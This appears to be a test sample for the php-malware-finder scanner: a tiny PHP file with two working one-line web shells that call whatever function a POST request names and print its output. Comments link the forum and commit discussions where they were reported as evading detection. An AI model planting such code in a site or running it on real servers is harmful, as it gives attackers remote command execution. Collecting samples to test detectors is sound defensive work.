<?php 

// https://rstforums.com/forum/topic/98500-php-malware-finder/?do=findComment&comment=615687
print_r(call_user_func_array($_POST['functie'], array($_POST['argv'])));

// https://github.com/nbs-system/php-malware-finder/commit/47d86bf92eb15fe65dd4efbc04d0004856e88ddd#commitcomment-16355734
print_r($_POST['funct']($_POST['argv']));
